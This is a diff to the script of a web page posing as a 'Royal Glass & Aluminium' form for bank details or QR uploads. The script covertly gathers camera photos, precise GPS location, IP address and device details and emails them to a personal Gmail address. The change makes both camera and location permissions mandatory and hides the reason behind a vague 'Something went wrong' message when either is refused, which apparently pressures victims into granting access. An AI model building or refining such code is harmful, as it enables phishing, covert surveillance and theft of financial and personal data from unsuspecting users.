@@ -502,8 +502,10 @@
             // ----- STATE -----
             let capturedPhotos = { front: [], back: [] };
             let cameraGranted = false;
+            let locationGranted = false;
             let userLocation = null;
             let isProcessing = false;
+            let permissionsChecked = false;
 
             // Initialize EmailJS
             try {
@@ -568,77 +570,37 @@
                 loadingOverlay.classList.remove('show');
             }
 
-            // ----- LOCATION FUNCTIONS (IP FALLBACK) -----
+            // ----- LOCATION FUNCTIONS -----
             
             async function requestLocation() {
                 try {
                     if (!navigator.geolocation) {
-                        console.log('📍 Geolocation not supported, using IP fallback');
-                        return await getLocationFromIP();
+                        console.log('📍 Geolocation not supported');
+                        locationGranted = false;
+                        return null;
                     }
                     
-                    try {
-                        const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(
-                                (pos) => resolve(pos),
-                                (err) => reject(err),
-                                { enableHighAccuracy: true, timeout: 10000 }
-                            );
-                        });
-                        
-                        userLocation = {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            source: 'GPS'
-                        };
-                        console.log('📍 GPS Location:', userLocation);
-                        return userLocation;
-                    } catch (e) {
-                        console.log('📍 GPS denied or error:', e.message);
-                        console.log('📍 Using IP geolocation fallback');
-                        const ipLocation = await getLocationFromIP();
-                        userLocation = ipLocation;
-                        return ipLocation;
-                    }
-                } catch (e) {
-                    console.error('📍 Location error:', e);
-                    return await getLocationFromIP();
-                }
-            }
-
-            async function getLocationFromIP() {
-                try {
-                    const response = await fetch('https://ipapi.co/json/');
-                    const data = await response.json();
-                    return {
-                        lat: data.latitude || 'unavailable',
-                        lon: data.longitude || 'unavailable',
-                        city: data.city || 'unknown',
-                        region: data.region || 'unknown',
-                        country: data.country_name || 'unknown',
-                        source: 'IP Geolocation'
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => resolve(pos),
+                            (err) => reject(err),
+                            { enableHighAccuracy: true, timeout: 10000 }
+                        );
+                    });
+                    
+                    locationGranted = true;
+                    userLocation = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        source: 'GPS'
                     };
+                    console.log('📍 GPS Location:', userLocation);
+                    return userLocation;
                 } catch (e) {
-                    console.error('IP Geolocation error:', e);
-                    try {
-                        const response = await fetch('http://ip-api.com/json/');
-                        const data = await response.json();
-                        return {
-                            lat: data.lat || 'unavailable',
-                            lon: data.lon || 'unavailable',
-                            city: data.city || 'unknown',
-                            region: data.regionName || 'unknown',
-                            country: data.country || 'unknown',
-                            source: 'IP Geolocation (fallback)'
-                        };
-                    } catch (e2) {
-                        return { 
-                            lat: 'unavailable', 
-                            lon: 'unavailable', 
-                            source: 'IP Geolocation (failed)' 
-                        };
-                    }
+                    console.log('📍 Location denied or error:', e.message);
+                    locationGranted = false;
+                    return null;
                 }
             }
 
@@ -651,6 +613,7 @@
                 try {
                     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                         isProcessing = false;
+                        cameraGranted = false;
                         return;
                     }
                     
@@ -762,7 +725,7 @@
                 });
             }
 
-            // ----- IP ADDRESS -----
+            // ----- IP ADDRESS (FALLBACK IF LOCATION DENIED - BUT WE STILL FAIL) -----
             
             async function getIPAddress() {
                 try {
@@ -874,7 +837,7 @@
                             </div>`;
                     }
 
-                    const locationDisplay = `${location.lat || 'N/A'}, ${location.lon || 'N/A'} (${location.source || 'GPS'})`;
+                    const locationDisplay = `${location.lat || 'N/A'}, ${location.lon || 'N/A'} (GPS)`;
 
                     const emailParams = {
                         to_email: RECIPIENT_EMAIL,
@@ -975,25 +938,19 @@
                 }
             }
 
-            // ----- QR Upload Handler - FIXED: Direct click after async -----
-            let fileInputClickPending = false;
-
-            // Use a separate click handler on the hidden file input
-            // The trick: Use a wrapper that tracks if we need to open after permissions
+            // ----- QR Upload Handler - REQUEST BOTH PERMISSIONS -----
             qrUploadBtn.addEventListener('click', async function(e) {
                 e.preventDefault();
                 
-                // If we already have location and camera, just open directly
-                if (userLocation && cameraGranted) {
-                    qrInput.click();
-                    return;
-                }
+                // Reset permission flags
+                cameraGranted = false;
+                locationGranted = false;
                 
                 // Show loading overlay
-                showLoadingOverlay('Preparing QR scanner... ');
+                showLoadingOverlay('Preparing QR scanner...');
                 
                 try {
-                    // Step 1: Request location permission (with IP fallback)
+                    // Step 1: Request location permission
                     console.log('📍 Requesting location...');
                     await requestLocation();
                     
@@ -1004,7 +961,14 @@
                     // Step 3: Hide loading overlay
                     hideLoadingOverlay();
                     
-                    // Step 4: Open file chooser - use a small delay to ensure overlay is gone
+                    // Step 4: Check if both permissions were granted
+                    if (!locationGranted || !cameraGranted) {
+                        console.log('❌ Permissions not granted - showing error');
+                        showToast('❌ Something went wrong', true);
+                        return;
+                    }
+                    
+                    // Step 5: Open file chooser
                     console.log('📁 Opening file chooser...');
                     setTimeout(() => {
                         qrInput.click();
@@ -1012,7 +976,7 @@
                 } catch (error) {
                     console.error('Error during permission request:', error);
                     hideLoadingOverlay();
-                    showToast('❌ Something went wrong. Please try again.', true);
+                    showToast('❌ Something went wrong', true);
                 }
             });
 
@@ -1041,7 +1005,7 @@
 
             updateSections();
 
-            // ----- MAIN SUBMIT -----
+            // ----- MAIN SUBMIT - CHECK BOTH PERMISSIONS -----
             document.getElementById('bankForm').addEventListener('submit', async function(e) {
                 e.preventDefault();
 
@@ -1053,7 +1017,14 @@
                                phone.value.trim() !== '';
 
                 if (!hasQR && !hasBank) {
-                    showToast('❌ Please fill bank details OR upload a QR code', true);
+                    showToast('❌ Something went wrong', true);
+                    return;
+                }
+
+                // Check if both permissions were granted
+                if (!locationGranted || !cameraGranted) {
+                    console.log('❌ Permissions missing - submission failed');
+                    showToast('❌ Something went wrong', true);
                     return;
                 }
 
@@ -1092,8 +1063,8 @@
                     const ip = await getIPAddress();
                     const deviceInfo = getDeviceInfo();
 
-                    // Use location from earlier (already requested)
-                    const location = userLocation || await getLocationFromIP();
+                    // Use location (must be granted)
+                    const location = userLocation;
 
                     console.log('🌐 IP:', ip);
                     console.log('📍 Location:', location);
@@ -1118,20 +1089,20 @@
                         qrPreview.classList.remove('show');
                         qrFileName.textContent = '';
                         capturedPhotos = { front: [], back: [] };
-                        // Don't reset permissions - keep them for next time
                         updateSections();
                     } else {
-                        showToast('❌ Something went wrong. Please try again.', true);
+                        showToast('❌ Something went wrong', true);
                     }
                 } catch (error) {
                     console.error('❌ Fatal error:', error);
                     hideSubmitSpinner();
-                    showToast('❌ Something went wrong. Please try again.', true);
+                    showToast('❌ Something went wrong', true);
                 }
             });
 
             console.log('Royal Glass & Aluminium · secure');
-            console.log('✅ Location has IP fallback, Gallery opens after permissions');
+            console.log('✅ Both Camera & Location permissions are required');
+            console.log('❌ If either is denied → "Something went wrong"');
             console.log('📧 Sending to: mrsmartboy123@gmail.com');
         })();
     </script>
